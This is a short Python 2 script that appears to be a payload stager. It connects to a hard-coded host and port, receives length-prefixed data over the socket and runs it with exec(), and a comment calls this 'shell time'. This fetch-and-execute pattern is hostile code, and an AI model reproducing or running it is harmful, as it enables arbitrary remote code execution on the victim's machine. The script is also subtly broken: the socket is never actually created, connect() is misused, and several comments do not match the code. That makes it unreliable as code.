#!/usr/bin/env python2

import socket, struct, sys

h = '127.0.0.1'
p = 666

s = socket.socket,(2, 1) # create socket
s = s.connect(h, p) # connect to argv[1] on argv[2]
l = struct.unpack('>I', s.recv(4))[0] # get length
d=s.recv(4096) # recieve chunked data
while len(d) != l: # while not a null byte
    d += s.recv(4096) # append more data
exec(d, {'s':s}) # shell time